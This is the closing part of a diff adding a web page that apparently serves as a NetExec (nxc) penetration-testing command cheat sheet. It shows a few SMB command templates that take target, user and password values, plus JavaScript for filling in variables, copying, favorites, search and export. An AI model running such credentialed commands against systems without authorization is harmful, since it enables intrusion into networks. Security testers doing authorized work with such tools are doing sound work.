+["Verbose mode","nxc smb {TARGET} -u {USER} -p {PASS} --verbose"],
+["Debug mode","nxc smb {TARGET} -u {USER} -p {PASS} --debug"],
+["Log output","nxc smb {TARGET} -u {USER} -p {PASS} --log output.log"],
+["Threads control","nxc smb {TARGET} -u {USER} -p {PASS} -t 100"],
+["No progress","nxc smb {TARGET} -u {USER} -p {PASS} --no-progress"],
+]},
+]},
+];
+
+// ═══════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════
+let favorites = JSON.parse(localStorage.getItem('nxc_favs') || '{}');
+let doneItems = JSON.parse(localStorage.getItem('nxc_done') || '{}');
+
+function gv() {
+  return {
+    TARGET: document.getElementById('target').value,
+    USER: document.getElementById('user').value,
+    PASS: document.getElementById('pass').value,
+    HASH: document.getElementById('hash').value,
+    LHOST: document.getElementById('lhost').value,
+    LPORT: document.getElementById('lport').value,
+    DOMAIN: document.getElementById('domain').value,
+    SHARE: document.getElementById('share').value,
+  };
+}
+
+function sub(s) {
+  const v = gv();
+  return s.replace(/\{(\w+)\}/g, (m, k) => v[k] !== undefined ? v[k] : m);
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function mkId(secId, gi, ci) { return `c_${secId}_${gi}_${ci}`; }
+
+function renderTags(tags) {
+  if (!tags || !tags.length) return '';
+  return tags.map(t => {
+    if (t === 'crit') return '<span class="tag tag-crit">CRITICAL</span>';
+    if (t === 'high') return '<span class="tag tag-high">HIGH</span>';
+    if (t === 'med') return '<span class="tag tag-med">MEDIUM</span>';
+    if (t === 'osep') return '<span class="tag tag-osep">OSEP</span>';
+    if (t === 'new') return '<span class="tag tag-new">NEW</span>';
+    if (t === 'example') return '<span class="tag tag-example">EXAMPLE</span>';
+    return '';
+  }).join('');
+}
+
+function renderRow(cmd, secId, gi, ci) {
+  const [desc, raw, tags] = [cmd[0], cmd[1], cmd[2] || []];
+  const id = mkId(secId, gi, ci);
+  const isFav = favorites[id] || false;
+  const isDone = doneItems[id] || false;
+  const borderCls = isFav ? ' fav-row' : '';
+  return `<div class="row${borderCls}${isDone ? ' done-row' : ''}" id="row_${id}">
+    <div class="ri">
+      <div class="rd">${escHtml(desc)} ${renderTags(tags)}</div>
+      <div class="rc" id="${id}">${escHtml(sub(raw))}</div>
+    </div>
+    <div class="row-actions">
+      <button class="cp" onclick="doCopy(this,'${id}')">Copy</button>
+      <button class="fav-btn${isFav ? ' on' : ''}" onclick="toggleFavItem('${id}','${escHtml(desc).replace(/'/g,"\\'")}',this)">★</button>
+      <button class="done-btn${isDone ? ' on' : ''}" onclick="toggleDone('${id}')">✔</button>
+    </div>
+  </div>`;
+}
+
+function buildSidebar() {
+  const sb = document.getElementById('sidebar');
+  let h = '';
+  D.forEach(s => {
+    const total = s.groups.reduce((a, g) => a + g.c.length, 0);
+    h += `<div class="sg">${s.icon || ''} ${s.label}</div>`;
+    h += `<div class="si${D[0].id === s.id ? ' on' : ''}" data-id="${s.id}">
+      <span>${s.label}</span>
+      <span class="cnt">${total}</span>
+    </div>`;
+  });
+  sb.querySelector('.sb-top').insertAdjacentHTML('afterend', h);
+  sb.querySelectorAll('.si').forEach(el => {
+    el.onclick = () => {
+      document.querySelectorAll('.si').forEach(x => x.classList.remove('on'));
+      document.querySelectorAll('.sec').forEach(x => x.classList.remove('on'));
+      el.classList.add('on');
+      document.getElementById('s-' + el.dataset.id).classList.add('on');
+      document.getElementById('searchResults').classList.remove('on');
+      document.getElementById('searchInput').value = '';
+    };
+  });
+}
+
+function buildSections() {
+  const cont = document.getElementById('sections');
+  let html = '';
+  D.forEach((s, si) => {
+    const totalCmds = s.groups.reduce((a,g)=>a+g.c.length,0);
+    html += `<div id="s-${s.id}" class="sec${si === 0 ? ' on' : ''}">`;
+    html += `<div class="sec-hdr">
+      <div class="sec-title">${s.icon || ''} ${s.label}</div>
+      <span class="sec-cmds-badge">${totalCmds} commands</span>
+      <button class="sec-export" onclick="exportSection('${s.id}')">↓ Export</button>
+    </div>`;
+    s.groups.forEach((g, gi) => {
+      const grpId = `grp_${s.id}_${gi}`;
+      html += `<div class="grp" id="${grpId}">
+        <div class="grp-title" onclick="toggleGrp('${grpId}')">
+          ${escHtml(g.t)} <span style="color:var(--text3);font-weight:400;text-transform:none;letter-spacing:0">(${g.c.length})</span>
+          <span class="collapse-icon">▾</span>
+        </div>
+        <div class="grp-body" id="body_${grpId}">`;
+      g.c.forEach((cmd, ci) => { html += renderRow(cmd, s.id, gi, ci); });
+      html += '</div></div>';
+    });
+    html += '</div>';
+  });
+  cont.innerHTML = html;
+}
+
+function toggleGrp(grpId) {
+  const title = document.querySelector(`#${grpId} .grp-title`);
+  const body = document.getElementById('body_' + grpId);
+  if (!body) return;
+  const collapsed = body.classList.toggle('collapsed');
+  title?.classList.toggle('collapsed', collapsed);
+}
+
+function refreshAllCmds() {
+  document.querySelectorAll('.rc').forEach(el => {
+    const id = el.id;
+    if (!id || !id.startsWith('c_')) return;
+    const parts = id.replace('c_','').split('_');
+    const sec = D.find(x => x.id === parts[0]);
+    if (!sec) return;
+    const cmd = sec.groups[parseInt(parts[1])]?.c[parseInt(parts[2])];
+    if (!cmd) return;
+    el.textContent = sub(cmd[1]);
+  });
+  const q = document.getElementById('searchInput').value.trim();
+  if (q) doSearch(q);
+}
+
+document.querySelectorAll('.vi').forEach(i => {
+  i.addEventListener('input', refreshAllCmds);
+});
+
+// ─── COPY ──────────────────────────────────────────────────
+function doCopy(btn, id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const txt = el.textContent;
+  copyToClipboard(txt);
+  btn.textContent = '✓';
+  btn.classList.add('ok');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1500);
+  showToast('✓ Copied to clipboard');
+}
+
+function copyToClipboard(text) {
+  try { navigator.clipboard.writeText(text); return; } catch(e) {}
+  const ta = document.createElement('textarea');
+  ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+  document.body.appendChild(ta); ta.select();
+  document.execCommand('copy'); document.body.removeChild(ta);
+}
+
+function showToast(msg) {
+  const t = document.getElementById('copyToast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._tid);
+  t._tid = setTimeout(() => t.classList.remove('show'), 1800);
+}
+
+// ─── FAVORITES ─────────────────────────────────────────────
+function toggleFavItem(id, desc, btn) {
+  favorites[id] = !favorites[id];
+  if (!favorites[id]) delete favorites[id];
+  localStorage.setItem('nxc_favs', JSON.stringify(favorites));
+  btn.classList.toggle('on');
+  const row = document.getElementById('row_' + id);
+  if (row) row.classList.toggle('fav-row', !!favorites[id]);
+  updateFavCount();
+  renderFavList();
+}
+
+function updateFavCount() {
+  document.getElementById('favCount').textContent = Object.keys(favorites).length;
+}
+
+function toggleFav() {
+  const p = document.getElementById('favPanel');
+  p.classList.toggle('on');
+  if (p.classList.contains('on')) renderFavList();
+}
+
+function renderFavList() {
+  const fl = document.getElementById('favList');
+  const keys = Object.keys(favorites);
+  if (!keys.length) { fl.innerHTML = '<div class="empty"><div class="empty-icon">⭐</div>No favorites yet.</div>'; return; }
+  let h = '';
+  keys.forEach(id => {
+    const parts = id.replace('c_','').split('_');
+    const secId = parts[0]; const gi = parseInt(parts[1]); const ci = parseInt(parts[2]);
+    const sec = D.find(x => x.id === secId);
+    if (!sec || !sec.groups[gi] || !sec.groups[gi].c[ci]) return;
+    const cmd = sec.groups[gi].c[ci];
+    h += `<div class="row fav-row" style="margin-bottom:6px">
+      <div class="ri">
+        <div class="rd">${escHtml(cmd[0])} <span style="color:var(--text3);font-size:10px">${sec.label}</span></div>
+        <div class="rc">${escHtml(sub(cmd[1]))}</div>
+      </div>
+      <div class="row-actions">
+        <button class="cp" onclick="copyFavText('${id}',this)">Copy</button>
+        <button class="fav-btn on" onclick="removeFav('${id}')">★</button>
+      </div>
+    </div>`;
+  });
+  fl.innerHTML = h;
+}
+
+function copyFavText(id, btn) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  copyToClipboard(el.textContent);
+  btn.textContent = '✓';
+  btn.classList.add('ok');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1500);
+  showToast('✓ Copied to clipboard');
+}
+
+function removeFav(id) {
+  delete favorites[id];
+  localStorage.setItem('nxc_favs', JSON.stringify(favorites));
+  const row = document.getElementById('row_' + id);
+  if (row) {
+    row.classList.remove('fav-row');
+    const fb = row.querySelector('.fav-btn');
+    if (fb) fb.classList.remove('on');
+  }
+  updateFavCount();
+  renderFavList();
+}
+
+// ─── DONE ──────────────────────────────────────────────────
+function toggleDone(id) {
+  const row = document.getElementById('row_' + id);
+  const btn = row?.querySelector('.done-btn');
+  if (doneItems[id]) {
+    delete doneItems[id];
+    row?.classList.remove('done-row');
+    btn?.classList.remove('on');
+  } else {
+    doneItems[id] = true;
+    row?.classList.add('done-row');
+    btn?.classList.add('on');
+  }
+  localStorage.setItem('nxc_done', JSON.stringify(doneItems));
+}
+
+// ─── SEARCH ────────────────────────────────────────────────
+let searchTimeout;
+document.getElementById('searchInput').addEventListener('input', function() {
+  clearTimeout(searchTimeout);
+  searchTimeout = setTimeout(() => doSearch(this.value.trim()), 200);
+});
+
+function doSearch(q) {
+  const sr = document.getElementById('searchResults');
+  const secs = document.getElementById('sections');
+  if (!q) {
+    sr.classList.remove('on'); sr.innerHTML = '';
+    secs.style.display = ''; return;
+  }
+  secs.style.display = 'none';
+  sr.classList.add('on');
+  const ql = q.toLowerCase();
+  const results = [];
+  D.forEach(s => {
+    s.groups.forEach((g, gi) => {
+      g.c.forEach((cmd, ci) => {
+        if ((cmd[0] + ' ' + cmd[1]).toLowerCase().includes(ql))
+          results.push({s, g, gi, cmd, ci});
+      });
+    });
+  });
+  let h = `<div class="sr-count">Found <span>${results.length}</span> result${results.length !== 1 ? 's' : ''} for "<b>${escHtml(q)}</b>"</div>`;
+  if (!results.length) h += '<div class="empty"><div class="empty-icon">🔍</div>No commands match.</div>';
+  results.forEach(({s, g, gi, cmd, ci}) => {
+    const id = mkId(s.id, gi, ci);
+    const isFav = favorites[id];
+    h += `<div class="row${isFav ? ' fav-row' : ''}">
+      <div class="ri">
+        <div class="rd">${escHtml(cmd[0])} <span style="color:var(--text3);font-size:10px">${escHtml(s.label)} › ${escHtml(g.t)}</span></div>
+        <div class="rc" id="sr_${id}">${escHtml(sub(cmd[1]))}</div>
+      </div>
+      <div class="row-actions">
+        <button class="cp" onclick="copyFavText('sr_${id}',this)">Copy</button>
+      </div>
+    </div>`;
+  });
+  sr.innerHTML = h;
+}
+
+// ─── EXPORT ─────────────────────────────────────────────────
+function exportSection(secId) {
+  const s = D.find(x => x.id === secId);
+  if (!s) return;
+  const v = gv();
+  let txt = `# NXC - ${s.label}\n# Exported: ${new Date().toLocaleString()}\n\n`;
+  txt += '# Variables:\n';
+  Object.entries(v).forEach(([k,val]) => { txt += `# ${k} = ${val}\n`; });
+  txt += '\n';
+  s.groups.forEach(g => {
+    txt += `\n## ${g.t}\n`;
+    g.c.forEach(cmd => {
+      txt += `\n### ${cmd[0]}\n${sub(cmd[1])}\n`;
+    });
+  });
+  const blob = new Blob([txt], {type:'text/plain'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = `nxc_${secId}_${new Date().toISOString().slice(0,10)}.txt`;
+  a.click();
+}
+
+function exportAll() {
+  const v = gv();
+  let txt = '# NXC Command Center - Complete Export\n';
+  txt += `# Exported: ${new Date().toLocaleString()}\n\n`;
+  txt += '# Variables:\n';
+  Object.entries(v).forEach(([k,val]) => { txt += `# ${k} = ${val}\n`; });
+  txt += '\n';
+  D.forEach(s => {
+    txt += `\n## ${s.label}\n`;
+    s.groups.forEach(g => {
+      txt += `\n### ${g.t}\n`;
+      g.c.forEach(cmd => {
+        txt += `\n#### ${cmd[0]}\n${sub(cmd[1])}\n`;
+      });
+    });
+  });
+  const blob = new Blob([txt], {type:'text/plain'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = `nxc_all_${new Date().toISOString().slice(0,10)}.txt`;
+  a.click();
+}
+
+function toggleShortcuts() {
+  document.getElementById('shortcutPanel').classList.toggle('on');
+}
+
+// ─── KEYBOARD SHORTCUTS ──────────────────────────────────
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    document.getElementById('searchInput').focus();
+    document.getElementById('searchInput').select();
+    return;
+  }
+  if ((e.ctrlKey || e.metaKey) && e.key === '/') {
+    e.preventDefault(); toggleShortcuts(); return;
+  }
+  if ((e.ctrlKey || e.metaKey) && (e.key === 'ArrowRight' || e.key === 'ArrowLeft')) {
+    e.preventDefault();
+    const items = Array.from(document.querySelectorAll('.si'));
+    const cur = items.findIndex(x => x.classList.contains('on'));
+    const next = e.key === 'ArrowRight' ? Math.min(cur+1, items.length-1) : Math.max(cur-1, 0);
+    if (items[next]) items[next].click(); return;
+  }
+  if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'F') {
+    e.preventDefault(); toggleFav(); return;
+  }
+  if (e.key === 'Escape') {
+    document.getElementById('shortcutPanel').classList.remove('on');
+    const si = document.getElementById('searchInput');
+    if (si.value) { si.value = ''; doSearch(''); return; }
+  }
+});
+
+// ─── INIT ──────────────────────────────────────────────────
+buildSidebar();
+buildSections();
+updateFavCount();
+</script>
+</body>
+</html>
